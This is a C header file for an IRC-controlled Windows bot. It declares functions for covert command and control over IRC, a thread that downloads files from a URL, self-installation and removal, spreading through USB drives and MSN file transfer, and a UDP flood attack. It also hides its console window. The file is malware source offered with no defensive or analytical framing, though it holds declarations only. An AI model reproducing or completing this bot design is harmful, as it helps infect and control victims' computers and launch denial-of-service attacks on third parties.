#include <string>
using namespace std;
//#define DEBUGGING

#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define THREAD_WAIT_TIME		30
#define MAX_THREADS				256
#define MAX_NICKLEN				40
#define REQ_NICKLEN				5

typedef enum
{
	MSG_PASS,
	MSG_NICK,
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PART,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;
typedef enum
{
	NONE,
	T_DOWNLOAD,
} thread_type;

typedef struct NTHREAD {
	void *conn;
	char target[128];
	int  threadnum;
	
	char *data1;
	char *data2;
	char *data3;

	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;

	int idata1;
	int idata2;

	SOCKET sock;
	SOCKET csock;

	BOOL verbose;
	BOOL silent;
	BOOL gotinfo;

} NTHREAD;

typedef struct 
{
	char	url[256];
	char	destination[MAX_PATH];
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} download_s;

typedef struct
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

//cipher
char *meglan(string toBeEncrypted, string sKey);
//nick
char *GenerateNickA(void);
char *GenerateNumber(int Len);
char *GenerateOS(void);
char *GenerateID(void);
//connect
unsigned int Resolve(char *host);
char *GetMyIP(SOCKET sock);
//threads
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);
//irc
DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);
DWORD WINAPI DL_Thread(LPVOID param);

BOOL NET_Initialize(void);
int IRC_Begin(void);
int IRC_Listen(SOCKET socket);
int IRC_ParseSingleCommand(SOCKET sock, char **word, int p,int words, char *from);

//install
BOOL MoveBot(char *MTP, char *Bname);
void uninstall(BOOL b);

DWORD WINAPI USB_Spreader(LPVOID param);
DWORD WINAPI MsnFile1(LPVOID param);

//udp flood
void udp(char *target, char *port, char *num, char *size, char *delay, char *timeout);
